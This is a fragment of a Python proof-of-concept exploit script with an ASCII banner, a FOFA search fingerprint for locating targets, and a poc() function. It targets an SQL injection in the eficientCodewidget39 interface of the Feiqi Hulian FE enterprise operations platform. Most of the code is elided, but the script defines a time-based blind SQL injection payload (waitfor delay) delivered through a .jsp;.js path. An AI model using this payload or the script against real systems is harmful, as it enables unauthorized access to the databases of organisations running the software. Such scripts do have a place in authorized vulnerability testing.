...
#version < 7.0
#app="FE-协作平台" FQHLFE_eficientCodewidget39_sql.py
 ...
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒   ░▀▀▒ 
  ...
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░      ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░     ░    
                                    author:           🐖sawa🐇
                                    version:          1.0.0
                                    For:              飞企互联-FE企业运营管理平台 eficientCodewidget39接口SQL注入漏洞░                                                     
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="this is a 飞企互联-FE企业运营管理平台 eficientCodewidget39接口SQL注入漏洞")
...
def poc(target):
    payload_url = "/common/efficientCodewidget39.jsp;.js?code=1';waitfor+delay+'0:0:5'--"
